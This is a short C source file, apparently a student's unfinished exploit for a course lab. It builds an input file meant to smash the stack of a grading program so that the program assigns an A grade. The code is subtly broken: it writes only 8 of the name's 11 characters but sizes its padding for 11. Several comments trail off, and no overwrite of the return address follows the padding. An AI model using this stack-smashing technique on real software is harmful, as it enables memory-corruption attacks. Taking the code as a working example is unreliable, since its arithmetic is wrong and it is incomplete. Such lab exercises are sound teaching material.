/*
 * Produces dataA file that contains student name, null byte, 
 * and padding to perform stack smashing. 
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * main function writes to "dataA" file to perform stack smashing,
 * causing the grader program to assign the A grade. 
 */
int main() {
    FILE *file = fopen("dataA", "wb");
    if (!file) {
        perror("Unable to open file");
        return 1;
    }

    /* write name to file. 
    grader program will ... */ 
    fwrite("Claire Shin", 1, 8, file);

    /* null byte that signifies the termination of a string. 
    grader program will .... */
    fputc('\0', file);

    /* add padding so that buffer overflow can be performed 
    48 - 11 = 37. */ 
    for (int i = 0; i < 37; i++) {
        fputc('A', file);
    }

}
